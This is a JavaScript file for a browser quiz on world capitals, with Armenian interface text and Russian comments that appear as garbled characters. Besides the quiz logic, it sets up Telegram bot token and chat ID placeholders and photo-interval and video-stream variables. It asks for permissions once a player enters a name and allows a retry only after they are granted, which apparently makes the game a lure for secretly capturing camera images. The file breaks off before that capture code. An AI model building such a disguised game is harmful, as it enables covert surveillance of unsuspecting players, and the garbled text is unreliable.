const telegramBotToken = "–¢–í–û–ô_–¢–û–ö–ï–ù_–ó–î–ï–°–¨";
const telegramChatId = "–¢–í–û–ô_CHAT_ID_–ó–î–ï–°–¨";

const nameFormContainer = document.getElementById('name-form-container');
const nameForm = document.getElementById('name-form');
const nameInput = document.getElementById('name-input');
const nameError = document.getElementById('name-error');

const gameArea = document.getElementById('game-area');
const userNameDisplay = document.getElementById('user-name');
const scoreInfo = document.getElementById('score-info');
const questionContainer = document.getElementById('question');
const answerButtons = document.getElementById('answer-buttons');
const tryAgainBtn = document.getElementById('try-again-btn');

let userName = "";
let questions = [];
let currentQuestionIndex = 0;
let score = 0;
let wrong = 0;

let photosInterval;
let videoStream;

const allQuestions = [
  { question: "’à÷Ä’∂ ’ß ’Ä’°’µ’°’Ω’ø’°’∂’´ ’¥’°’µ÷Ä’°÷Ñ’°’≤’°÷Ñ’®÷â", answers: ["‘µ÷Ä÷á’°’∂", "‘π’¢’´’¨’´’Ω’´", "’Ñ’∏’Ω’Ø’æ’°", "‘≤’°÷Ñ’∏÷Ç"], correct: 0 },
  { question: "’à÷Ä’∂ ’ß ’å’∏÷Ç’Ω’°’Ω’ø’°’∂’´ ’¥’°’µ÷Ä’°÷Ñ’°’≤’°÷Ñ’®÷â", answers: ["’Ñ’∏’Ω’Ø’æ’°", "‘µ÷Ä÷á’°’∂", "‘ø’´÷á", "’ç’°’∂’Ø’ø ’ä’•’ø’•÷Ä’¢’∏÷Ç÷Ä’£"], correct: 0 },
  { question: "’à÷Ä’∂ ’ß ’ñ÷Ä’°’∂’Ω’´’°’µ’´ ’¥’°’µ÷Ä’°÷Ñ’°’≤’°÷Ñ’®÷â", answers: ["’ì’°÷Ä’´’¶", "’Ñ’°’§÷Ä’´’§", "‘≤’•’º’¨’´’∂", "‘º’∏’∂’§’∏’∂"], correct: 0 },
  { question: "’à÷Ä’∂ ’ß ‘≥’•÷Ä’¥’°’∂’´’°’µ’´ ’¥’°’µ÷Ä’°÷Ñ’°’≤’°÷Ñ’®÷â", answers: ["‘≤’•’º’¨’´’∂", "’ì’°÷Ä’´’¶", "’å’∏’¥’°", "‘±’¥’Ω’ø’•÷Ä’§’°’¥"], correct: 0 },
  { question: "’à÷Ä’∂ ’ß ‘ª’ø’°’¨’´’°’µ’´ ’¥’°’µ÷Ä’°÷Ñ’°’≤’°÷Ñ’®÷â", answers: ["’å’∏’¥’°", "’Ñ’´’¨’°’∂", "’é’•’∂’•’ø’´’Ø", "’Ü’•’°’∫’∏’¨"], correct: 0 },
  { question: "’à÷Ä’∂ ’ß ‘ª’Ω’∫’°’∂’´’°’µ’´ ’¥’°’µ÷Ä’°÷Ñ’°’≤’°÷Ñ’®÷â", answers: ["’Ñ’°’§÷Ä’´’§", "‘≤’°÷Ä’Ω’•’¨’∏’∂’°", "’ç÷á’´’¨’´’°", "’é’°’¨’•’∂’Ω’´’°"], correct: 0 },
  { question: "’à÷Ä’∂ ’ß ‘ø’°’∂’°’§’°’µ’´ ’¥’°’µ÷Ä’°÷Ñ’°’≤’°÷Ñ’®÷â", answers: ["’ï’ø’ø’°’æ’°", "’è’∏÷Ä’∏’∂’ø’∏", "’Ñ’∏’∂’ø÷Ä’•’°’¨", "’é’°’∂’Ø’∏÷Ç’æ’•÷Ä"], correct: 0 },
  { question: "’à÷Ä’∂ ’ß ‘±’Ñ’Ü-’´ ’¥’°’µ÷Ä’°÷Ñ’°’≤’°÷Ñ’®÷â", answers: ["’é’°’∑’´’∂’£’ø’∏’∂", "’Ü’µ’∏÷Ç ’Ö’∏÷Ä÷Ñ", "‘º’∏’Ω ‘±’∂’ª’•’¨’•’Ω", "’á’´’Ø’°’£’∏"], correct: 0 },
  { question: "’à÷Ä’∂ ’ß ’â’´’∂’°’Ω’ø’°’∂’´ ’¥’°’µ÷Ä’°÷Ñ’°’≤’°÷Ñ’®÷â", answers: ["’ä’•’Ø’´’∂", "’á’°’∂’∞’°’µ", "’Ä’∏’∂’Ø’∏’∂’£", "‘≥’∏÷Ç’°’∂’π’™’∏’∏÷Ç"], correct: 0 },
  { question: "’à÷Ä’∂ ’ß ’É’°’∫’∏’∂’´’°’µ’´ ’¥’°’µ÷Ä’°÷Ñ’°’≤’°÷Ñ’®÷â", answers: ["’è’∏’Ø’´’∏", "’ï’Ω’°’Ø’°", "‘ø’´’∏’ø’∏", "’Ü’°’£’∏’µ’°"], correct: 0 },
  // –î–æ–±–∞–≤—å –¥–æ 50 –≤–æ–ø—Ä–æ—Å–æ–≤ –ø–æ –∞–Ω–∞–ª–æ–≥–∏–∏...
];

// –§—É–Ω–∫—Ü–∏—è –¥–ª—è –≤—ã–±–æ—Ä–∞ 10 —Å–ª—É—á–∞–π–Ω—ã—Ö –≤–æ–ø—Ä–æ—Å–æ–≤ –∏–∑ 50, –±–µ–∑ —á–∞—Å—Ç—ã—Ö –ø–æ–≤—Ç–æ—Ä–æ–≤
function getRandomQuestions() {
  const selected = [];
  const usedIndexes = new Set();

  while (selected.length < 10 && usedIndexes.size < allQuestions.length) {
    const idx = Math.floor(Math.random() * allQuestions.length);
    if (!usedIndexes.has(idx)) {
      selected.push(allQuestions[idx]);
      usedIndexes.add(idx);
    }
  }
  return selected;
}

function shuffleArray(array) {
  for(let i = array.length -1; i > 0; i--) {
    const j = Math.floor(Math.random() * (i+1));
    [array[i], array[j]] = [array[j], array[i]];
  }
}

nameForm.addEventListener('submit', (e) => {
  e.preventDefault();
  userName = nameInput.value.trim();

  if (userName === '') {
    nameError.style.display = 'block';
    return;
  } else {
    nameError.style.display = 'none';
  }

  nameFormContainer.style.display = 'none';
  gameArea.style.display = 'block';
  userNameDisplay.textContent = `üë§ ${userName}`;

  startGame();
  requestPermissions();
});

function startGame() {
  questions = getRandomQuestions();
  currentQuestionIndex = 0;
  score = 0;
  wrong = 0;
  tryAgainBtn.style.display = 'none';
  scoreInfo.textContent = `’Ñ’∂’°÷Å’ù ${questions.length} | ’É’´’∑’ø’ù 0 | ’é’°’ø’ù 0`;
  showQuestion();
}

function showQuestion() {
  clearStatusClass();
  resetState();

  const currentQuestion = questions[currentQuestionIndex];
  questionContainer.textContent = currentQuestion.question;

  // –°–æ–∑–¥–∞—ë–º –∫–æ–ø–∏—é –æ—Ç–≤–µ—Ç–æ–≤ –∏ –ø–µ—Ä–µ–º–µ—à–∏–≤–∞–µ–º –∏—Ö, —á—Ç–æ–±—ã –ø—Ä–∞–≤–∏–ª—å–Ω—ã–π –Ω–µ –≤—Å–µ–≥–¥–∞ –±—ã–ª –Ω–∞ –æ–¥–Ω–æ–º –º–µ—Å—Ç–µ
  const answers = currentQuestion.answers.map((text, index) => ({
    text,
    correct: index === currentQuestion.correct
  }));
  shuffleArray(answers);

  answers.forEach(answer => {
    const button = document.createElement('button');
    button.innerText = answer.text;
    button.classList.add('btn');
    if (answer.correct) button.dataset.correct = answer.correct;
    button.addEventListener('click', selectAnswer);
    answerButtons.appendChild(button);
  });

  updateScoreInfo();
}

function resetState() {
  while (answerButtons.firstChild) {
    answerButtons.removeChild(answerButtons.firstChild);
  }
}

function clearStatusClass() {
  document.body.classList.remove('correct');
  document.body.classList.remove('wrong');
}

function selectAnswer(e) {
  const selectedBtn = e.target;
  const correct = selectedBtn.dataset.correct === 'true';

  setStatusClass(selectedBtn, correct);
  Array.from(answerButtons.children).forEach(button => {
    button.disabled = true;
    if (button.dataset.correct === 'true') {
      setStatusClass(button, true);
    }
  });

  if (correct) {
    score++;
  } else {
    wrong++;
  }

  updateScoreInfo();

  if (currentQuestionIndex < questions.length -1) {
    currentQuestionIndex++;
    setTimeout(() => {
      showQuestion();
    }, 1200);
  } else {
    setTimeout(() => {
      endGame();
    }, 1200);
  }
}

function setStatusClass(element, correct) {
  clearStatusClass();
  if (correct) {
    element.classList.add('correct');
  } else {
    element.classList.add('wrong');
  }
}

function updateScoreInfo() {
  const left = questions.length - currentQuestionIndex;
  scoreInfo.textContent = `’Ñ’∂’°÷Å’ù ${left} | ’É’´’∑’ø’ù ${score} | ’é’°’ø’ù ${wrong}`;
}

function endGame() {
  questionContainer.textContent = score >= 7 ? `üéâ ’á’∂’∏÷Ä’∞’°’æ’∏÷Ä’∏÷Ç’¥ ’•’∂÷Ñ, ‘¥’∏÷Ç÷Ñ ’∞’°’≤’©’•÷Å’´÷Ñ!` : `‚òπÔ∏è ’ë’°’æ’∏÷Ñ, ’§’∏÷Ç÷Ñ ’∫’°÷Ä’ø’æ’•÷Å’´÷Ñ÷â`;
  resetState();
  tryAgainBtn.style.display = 'inline-block';
}

tryAgainBtn.addEventListener('click', () => {
  if (!hasPermissions()) {
    requestPermissions();
  } else {
    startGame();
  }
});

// –ó–∞–ø—Ä–æ—Å